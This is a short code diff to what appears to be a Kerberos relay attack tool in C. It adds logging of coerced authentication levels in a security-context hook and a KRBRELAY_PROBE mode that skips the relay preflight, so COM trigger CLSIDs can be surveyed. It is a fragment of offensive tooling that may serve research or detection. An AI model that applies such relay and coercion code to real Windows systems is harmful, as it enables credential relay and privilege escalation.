@@ -1351,6 +1351,11 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
                 g_state.relay_auth_type = auth_type;
                 g_state.relay_auth_level = rpc[token_offset - 7];
                 g_state.relay_token_first = rpc[token_offset];
+                /* Print at capture time so a trigger's auth level can be read
+                 * even when no relay is listening (level-2 trigger hunt). */
+                printf("[probe] coerced auth_type=%d auth_level=%d token0=0x%02x\n",
+                       auth_type, rpc[token_offset - 7], rpc[token_offset]);
+                fflush(stdout);
             }
         }
 
@@ -1894,8 +1899,16 @@ static int run_relay(void) {
     /* Reject an absent/stale target-side listener before publishing any hook
      * or RPC interface. accept_hook() later creates a separate token socket. */
     g_state.stage = STAGE_RELAY_BRIDGE;
-    if (!bridge_connect() || !bridge_preflight()) {
-        return 0;
+    /* Probe mode: with KRBRELAY_PROBE set, skip the relay preflight so the COM
+     * activation still runs with no relay listening. accept_hook then captures
+     * and prints the coerced auth level, for surveying trigger CLSIDs. */
+    {
+        char probe_flag[8];
+        if (GetEnvironmentVariableA("KRBRELAY_PROBE", probe_flag, sizeof(probe_flag)) == 0) {
+            if (!bridge_connect() || !bridge_preflight()) {
+                return 0;
+            }
+        }
     }
 
     /* SPN conversion is status-only and cannot change the initialized policy. */
